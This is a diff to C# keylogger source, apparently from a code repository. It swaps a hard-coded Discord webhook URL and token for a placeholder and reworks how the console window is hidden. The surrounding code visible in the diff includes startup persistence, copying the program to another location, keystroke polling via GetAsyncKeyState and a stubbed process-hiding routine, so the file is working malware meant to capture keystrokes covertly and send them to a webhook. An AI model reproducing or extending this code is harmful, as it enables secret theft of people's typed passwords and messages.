@@ -12,7 +12,7 @@ using Microsoft.Win32;
 class KeyLogger
 {
     // Webhook configuration
-    private static string webhookUrl = "https://discord.com/api/webhooks/1460302846003253280/J9JQZi-f-1eQ9Hv1JU1vHEHlp2KWvLCRMOLLopMTJ6wnZ5OXm3Je3lnxyDNh8oQDdyfd";
+    private static string webhookUrl = "YOUR_WEBHOOK_HERE";
     private static StringBuilder logBuffer = new StringBuilder();
     private static readonly object bufferLock = new object();
     private static bool isLogging = false;
@@ -45,14 +45,16 @@ class KeyLogger
     static extern IntPtr GetConsoleWindow();
 
     [DllImport("user32.dll")]
-    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    static extern bool ShowWindow(IntPtr hWnd, int nCmd);
+
+    const int SW_HIDE = 0;
+
 
     // Key state detection
     [DllImport("user32.dll")]
     private static extern short GetAsyncKeyState(int vKey);
 
     // Windows API constants
-    private const int SW_HIDE = 0;
     private const int SW_SHOW = 5;
     private const int VK_SHIFT = 160;
     private const int VK_CONTROL = 162;
@@ -109,6 +111,7 @@ class KeyLogger
         { 90, "z" }
     };
 
+    [STAThread]
     static void Main(string[] args)
     {
         try
@@ -119,7 +122,7 @@ class KeyLogger
             // Add to startup
             AddToStartup();
 
-            HideConsoleWindow();
+            //HideConsoleWindow();
 
             // Start logging
             StartLogging();
@@ -132,15 +135,13 @@ class KeyLogger
         
             CopyToSecureLocation();
 
-            SetupProcessHiding();
+            //SetupProcessHiding();
 
-            Thread.Sleep(Timeout.Infinite);
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
 
-            // Keep the application running
-            while (isRunning)
-            {
-                Thread.Sleep(1000);
-            }
+            // Your background logic
+            RunBackgroundProcess();
         }
         catch (Exception ex)
         {
@@ -202,7 +203,24 @@ class KeyLogger
         }
         catch { /* Silent failure */ }
     }
-
+    static void RunBackgroundProcess()
+    {
+        // Keep running indefinitely
+        while (true)
+        {
+            try
+            {
+                // Your background work here
+                Console.WriteLine($"Background process running at {DateTime.Now}");
+                Thread.Sleep(5000);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error: {ex.Message}");
+                Thread.Sleep(1000);
+            }
+        }
+    }
     private static void SetupProcessHiding()
     {
         try
